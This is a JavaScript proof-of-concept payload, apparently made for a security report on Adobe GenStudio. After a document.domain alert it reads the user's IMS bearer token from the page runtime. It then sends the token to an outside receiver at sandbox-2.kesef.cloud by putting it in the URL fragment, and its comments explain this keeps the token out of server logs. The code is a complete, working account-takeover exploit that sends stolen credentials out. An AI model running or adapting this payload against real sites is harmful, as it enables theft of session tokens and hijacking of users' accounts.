(async () => {
  // Stage 1: visible proof that attacker JavaScript runs on Adobe's origin.
  alert(document.domain);

  const receiver =
    'https://sandbox-2.kesef.cloud/static/adobe-genstudio-ims-ato-receiver-20261028.html';

  const waitForUserApi = async () => {
    for (let attempt = 0; attempt < 100; attempt += 1) {
      const runtime = window['exc-module-runtime'];
      if (runtime && typeof runtime.user === 'function') return runtime.user();
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    throw new Error('GenStudio IMS runtime unavailable');
  };

  const user = await waitForUserApi();
  const token = await user.get('imsToken');

  if (typeof token !== 'string' || token.split('.').length !== 3) {
    throw new Error('IMS bearer unavailable');
  }

  // Stage 2: after the alert is dismissed, hand the complete bearer to the
  // controlled Kesef receiver. A fragment keeps it out of HTTP/server logs.
  const destination = `${receiver}#token=${encodeURIComponent(token)}`;
  try {
    if (window.top && window.top !== window) {
      window.top.location.assign(destination);
      return;
    }
  } catch (_) {
    // Fall back to navigating the executing GenStudio frame.
  }
  location.assign(destination);
})().catch(error => {
  const message = error instanceof Error ? error.message : String(error);
  const receiver =
    'https://sandbox-2.kesef.cloud/static/adobe-genstudio-ims-ato-receiver-20261028.html';
  location.assign(`${receiver}#error=${encodeURIComponent(message)}`);
});
